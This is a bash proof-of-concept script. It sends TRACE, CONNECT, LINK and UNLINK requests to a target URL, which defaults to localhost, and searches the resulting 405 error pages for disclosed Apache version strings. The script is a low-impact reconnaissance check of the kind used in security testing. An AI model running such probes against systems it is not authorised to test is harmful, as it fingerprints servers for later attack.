#!/bin/bash

# POC: 405 Method Not Allowed Error Page Version Disclosure
# This script demonstrates how unsupported HTTP methods (TRACE) trigger
# error pages that expose Apache version information

TARGET_URL="${1:-http://localhost/}"

echo "=========================================="
echo "405 Method Not Allowed - Version Disclosure POC"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Test 1: Send TRACE request to root path
echo "[*] Testing TRACE method on root path..."
echo ""

RESPONSE=$(curl -s -i -X TRACE "$TARGET_URL")

echo "Full Response:"
echo "$RESPONSE"
echo ""

# Extract status code
STATUS=$(echo "$RESPONSE" | head -n 1)
echo "[+] Status Line: $STATUS"
echo ""

# Check for Apache version in response body
if echo "$RESPONSE" | grep -q "Apache.*Server at"; then
    echo "[!] VULNERABILITY CONFIRMED: Apache version disclosed in error page"
    APACHE_VERSION=$(echo "$RESPONSE" | grep -oP 'Apache/[\d.]+[^<]*' | head -1)
    echo "[!] Disclosed Server Version: $APACHE_VERSION"
    echo ""
fi

# Check for TRACE method mentioned in response
if echo "$RESPONSE" | grep -qi "TRACE"; then
    echo "[!] HTTP Method Information Disclosed: TRACE method mentioned in error page"
    echo ""
fi

# Extract and display the error message
echo "Error Page Body Content:"
echo "$RESPONSE" | tail -n +2 | grep -A 10 "Method Not Allowed"
echo ""

# Test 2: Try other unsupported methods
echo "[*] Testing other unsupported HTTP methods for comparison..."
echo ""

for METHOD in CONNECT TRACE LINK UNLINK; do
    echo "Testing $METHOD method:"
    STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X "$METHOD" "$TARGET_URL")
    echo "  HTTP Status: $STATUS_CODE"
    
    if [ "$STATUS_CODE" = "405" ]; then
        echo "  [!] Returns 405 - Version disclosure likely present"
    fi
    echo ""
done

echo "=========================================="
echo "POC Complete"
echo "=========================================="